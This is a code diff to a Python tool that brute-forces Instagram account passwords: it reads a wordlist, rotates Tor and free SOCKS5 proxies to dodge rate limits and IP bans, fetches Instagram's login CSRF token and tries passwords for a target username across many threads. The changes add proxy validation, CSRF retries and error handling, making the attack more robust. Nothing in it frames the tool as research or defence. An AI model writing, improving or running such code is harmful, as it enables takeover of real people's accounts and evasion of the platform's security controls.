@@ -49,17 +49,32 @@ found = False
 lock = threading.Lock()
 resume_line = 0
 
+def is_valid_proxy(proxy):
+    """Validate proxy format and connectivity."""
+    if not proxy.startswith('socks5://'):
+        return False
+    try:
+        host, port = proxy.split('://')[1].split(':')
+        port = int(port)
+        if host == 'placeholder' or not host or port < 1 or port > 65535:
+            return False
+        socks.set_default_proxy(socks.SOCKS5, host, port)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect(('google.com', 80))
+        sock.close()
+        return True
+    except:
+        return False
+
 def get_proxies():
-    proxies = []
-    for port in TOR_PORTS:
-        proxies.append(f"socks5://127.0.0.1:{port}")
-    # Add free proxies
+    proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
     try:
         with open('proxies/free_proxies.txt', 'r') as f:
             for line in f:
                 line = line.strip()
-                if line:
-                    proxies.append(f"socks5://{line}")
+                if line and is_valid_proxy(line):
+                    proxies.append(line)
     except FileNotFoundError:
         print(f"{Colors.RED}[!] Proxies file missing! Using Tor only.{Colors.NC}")
     random.shuffle(proxies)
@@ -67,35 +82,41 @@ def get_proxies():
 
 def sort_proxies(proxies):
     working = []
-    def test_proxy(p):
-        try:
-            socks.set_default_proxy(socks.SOCKS5, p.split('://')[1].split(':')[0], int(p.split(':')[-1]))
-            socket.socket().connect(('google.com', 80))
-            return p
-        except:
-            return None
     print(f"{Colors.YELLOW}[*] Sorting proxies...{Colors.NC}")
     with ThreadPoolExecutor(max_workers=50) as exec:
-        working = [p for p in exec.map(test_proxy, proxies) if p]
+        working = [p for p in exec.map(lambda p: p if is_valid_proxy(p) else None, proxies) if p]
     with open('proxies/working_proxies.txt', 'w') as f:
         f.write('\n'.join(working))
     print(f"{Colors.GREEN}[+] {len(working)} working proxies saved!{Colors.NC}")
     return working
 
-def get_csrf(proxy=None):
-    session = requests.Session()
-    if proxy:
+def get_csrf(proxies):
+    for _ in range(3):  # Retry 3 times
+        proxy = random.choice(proxies)
+        if not is_valid_proxy(proxy):
+            print(f"{Colors.RED}[!] Skipping invalid proxy: {proxy}{Colors.NC}")
+            continue
+        session = requests.Session()
         session.proxies = {'http': proxy, 'https': proxy}
-    retry = Retry(total=3, backoff_factor=0.5)
-    adapter = HTTPAdapter(max_retries=retry)
-    session.mount('http://', adapter)
-    session.mount('https://', adapter)
-    session.headers = {'User-Agent': UA}
-    print(f"{Colors.YELLOW}[*] Fetching CSRF token...{Colors.NC}")
-    resp = session.get("https://www.instagram.com/accounts/login/")
-    csrf = resp.cookies.get('csrftoken', '')
-    session.close()
-    return csrf
+        retry = Retry(total=3, backoff_factor=0.5)
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        session.headers = {'User-Agent': UA}
+        print(f"{Colors.YELLOW}[*] Fetching CSRF token via {proxy}...{Colors.NC}")
+        try:
+            resp = session.get("https://www.instagram.com/accounts/login/", timeout=10)
+            csrf = resp.cookies.get('csrftoken', '')
+            session.close()
+            if csrf:
+                print(f"{Colors.GREEN}[+] CSRF token obtained!{Colors.NC}")
+                return csrf
+            print(f"{Colors.RED}[!] No CSRF token - Retrying...{Colors.NC}")
+        except requests.RequestException as e:
+            print(f"{Colors.RED}[!] CSRF fetch error: {e}{Colors.NC}")
+        finally:
+            session.close()
+    return None
 
 def sign_payload(payload):
     body = json.dumps(payload, separators=(',', ':'))
@@ -104,9 +125,11 @@ def sign_payload(payload):
 
 def try_password(username, password, proxy, csrf):
     global found
+    if not is_valid_proxy(proxy):
+        print(f"{Colors.RED}[!] Invalid proxy: {proxy}{Colors.NC}")
+        return False
     session = requests.Session()
-    if proxy:
-        session.proxies = {'http': proxy, 'https': proxy}
+    session.proxies = {'http': proxy, 'https': proxy}
     session.headers = {
         'User-Agent': UA,
         'X-IG-App-ID': APP_ID,
@@ -176,25 +199,35 @@ def main():
 
     # Load wordlist
     print(f"{Colors.YELLOW}[*] Loading wordlist: {args.w}...{Colors.NC}")
-    with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
-        words = [line.strip() for line in f if line.strip()]
+    try:
+        with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
+            words = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        print(f"{Colors.RED}[!] Wordlist not found: {args.w}{Colors.NC}")
+        return
     if args.r:
         resume_line = int(input(f"{Colors.YELLOW}Resume from line (0 for start): {Colors.NC}") or 0)
         words = words[resume_line:]
 
     # Proxies
     print(f"{Colors.YELLOW}[*] Loading proxies...{Colors.NC}")
-    with open(args.p, 'r') as f:
-        proxies = [line.strip() for line in f if line.strip()]
+    try:
+        with open(args.p, 'r') as f:
+            proxies = [line.strip() for line in f if line.strip() and is_valid_proxy(line)]
+    except FileNotFoundError:
+        proxies = []
     if not proxies:
         proxies = get_proxies()
         proxies = sort_proxies(proxies)
+    if not proxies:
+        print(f"{Colors.RED}[!] No valid proxies available! Start Tor with ./multitor.sh{Colors.NC}")
+        return
     print(f"{Colors.GREEN}[+] Loaded {len(words)} passwords, {len(proxies)} proxies, {args.t} threads{Colors.NC}")
 
     # CSRF
-    csrf = get_csrf(random.choice(proxies))
+    csrf = get_csrf(proxies)
     if not csrf:
-        print(f"{Colors.RED}[-] Failed to fetch CSRF token - Retry{Colors.NC}")
+        print(f"{Colors.RED}[-] Failed to fetch CSRF token - Check proxies/Tor{Colors.NC}")
         return
 
     queue = Queue()
